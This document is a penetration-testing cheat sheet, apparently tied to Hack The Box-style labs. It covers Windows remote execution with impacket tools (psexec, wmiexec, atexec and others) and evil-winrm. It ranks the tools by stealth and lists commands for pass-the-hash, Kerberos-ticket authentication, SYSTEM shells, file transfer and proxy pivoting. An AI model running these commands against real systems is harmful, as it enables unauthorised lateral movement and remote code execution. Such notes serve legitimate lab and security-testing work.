title: impacket
html:
impacket

> Suite of Python tools for Windows remote execution. Choose based on stealth, access level, and target config.

| Tool | Method | Runs As | Needs | Stealth | |------|--------|---------|-------|---------| | psexec.py | Service creation via SMB | SYSTEM | ADMIN$ write | Low (creates service) | | smbexec.py | Service creation via SCM | SYSTEM | ADMIN$ write | Low | | wmiexec.py | WMI process creation | User | DCOM (135) | Medium | | atexec.py | Scheduled task | SYSTEM | Task Scheduler RPC | Medium | | dcomexec.py | DCOM execution | User | DCOM (135) | Medium |

Authentication Methods

# Password
psexec.py 'domain/user:pass@target'

# Pass-the-Hash
psexec.py -hashes :NTHASH 'domain/user@target'

# Kerberos ticket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass 'domain/user@target.domain.htb'

# Clock skew (exegol)
faketime '+8 hours' psexec.py -k -no-pass ...

evil-winrm

# Password
evil-winrm -i target -u user -p 'pass'

# Hash
evil-winrm -i target -u user -H NTHASH

# With domain
evil-winrm -i target -u user -p 'pass' -r domain.htb

# Upload/download
upload /local/file.exe C:\remote\path
download C:\remote\file.txt /local/path

Common Patterns

# Quick command execution
wmiexec.py 'domain/user:pass@target' 'whoami'

# Interactive shell
psexec.py 'domain/user:pass@target'

# Through SOCKS proxy
proxychains psexec.py -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'domain/user@target.domain.htb'
